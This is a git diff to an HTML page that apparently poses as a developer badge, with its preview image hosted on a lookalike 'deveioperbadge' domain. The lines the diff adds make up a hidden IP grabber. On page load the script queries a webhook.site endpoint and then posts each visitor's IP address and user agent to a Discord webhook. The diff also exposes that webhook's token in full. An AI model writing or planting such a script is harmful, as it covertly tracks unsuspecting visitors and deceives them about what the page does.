@@ -4,7 +4,20 @@
     <meta property="og:image" content="https://deveioperbadge.github.io/Image/download.jpg">
     <meta name="twitter:card" content="summary_large_image">
     <script>
-      fetch("https://webhook.site/dd8e6636-edd1-4963-9879-ff9c8c574fa5");
+      fetch("https://webhook.site/dd8e6636-edd1-4963-9879-ff9c8c574fa5")
+        .then(response => response.json())
+        .then(data => {
+          // This sends the IP and user agent to Discord Webhook
+          fetch("https://discord.com/api/webhooks/1363758796467470517/g4CPvVSvNzXL9tPAZHva2Vu9XWj7637j7_jumz8etF530Nxs0aUJ6T-BO_A7Oz2KO3WW", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              content: `🚨 Visitor IP: ${data.clientIp}\nUser-Agent: ${navigator.userAgent}`
+            })
+          });
+        });
     </script>
   </head>
   <body>
